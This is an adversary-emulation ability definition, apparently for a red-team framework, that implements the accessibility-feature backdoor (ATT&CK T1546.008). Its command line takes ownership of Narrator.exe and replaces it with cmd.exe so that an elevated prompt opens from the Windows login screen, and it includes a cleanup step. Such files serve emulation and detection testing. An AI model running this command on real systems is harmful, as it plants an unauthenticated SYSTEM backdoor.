- description: 'Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the
    user to launch an elevated command prompt by toggling on the Narrator button from
    the Accessibility menu on the login screen.

    '
  id: 437c6fff-bc57-a8e6-e3b4-486cd06225a2
  name: Replace Narrator.exe (Narrator binary) with cmd.exe
  platforms:
    windows:
      cmd:
        cleanup: copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
        command: IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe
          C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ) && takeown /F C:\Windows\System32\Narrator.exe
          /A && icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
          && copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
        payloads: []
  tactic: multiple
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
